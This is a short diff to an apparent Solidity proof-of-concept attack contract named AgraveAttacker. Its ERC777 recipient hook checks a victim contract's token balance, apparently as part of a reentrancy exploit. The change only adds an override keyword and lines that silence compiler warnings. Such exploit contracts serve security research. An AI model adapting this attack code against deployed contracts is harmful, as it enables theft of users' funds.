@@ -25,7 +25,14 @@ contract AgraveAttacker is IERC777Recipient {
         uint256 amount,
         bytes calldata userData,
         bytes calldata operatorData
-    ) external {
+    ) external override {
+        // mute the compiler warinings
+        operator;
+        from;
+        to;
+        amount;
+        userData;
+        operatorData;
         // may be a better expression in if statement,
         // this version may lead to REVERT;
         if (token.balanceOf(address(victim)) >= 0) {
